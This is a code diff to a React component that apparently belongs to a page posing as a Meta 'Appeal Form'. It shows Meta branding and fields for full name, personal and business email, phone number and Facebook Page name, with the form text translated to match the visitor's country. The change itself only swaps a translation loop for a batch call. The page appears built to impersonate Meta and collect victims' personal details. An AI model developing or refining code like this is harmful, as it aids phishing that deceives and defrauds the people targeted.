@@ -1,6 +1,6 @@
 import MetaLogo from '@/assets/images/meta-logo-image.png';
 import { store } from '@/store/store';
-import translateText from '@/utils/translate';
+import { translateBatch } from '@/utils/translate';
 import { faXmark } from '@fortawesome/free-solid-svg-icons/faXmark';
 import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
 import axios from 'axios';
@@ -53,11 +53,7 @@ const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
         if (!geoInfo) return;
         const textsToTranslate = ['Appeal Form', 'Please provide us information that will help us investigate', 'Full Name', 'Personal Email', 'Business Email', 'Mobile phone number', 'Facebook Page Name', 'I agree with Terms of use', 'Submit'];
         const translateAll = async () => {
-            const translatedMap: Record<string, string> = {};
-            for (const text of textsToTranslate) {
-                translatedMap[text] = await translateText(text, geoInfo.country_code);
-            }
-
+            const translatedMap = await translateBatch(textsToTranslate, geoInfo.country_code);
             setTranslations(translatedMap);
         };
 
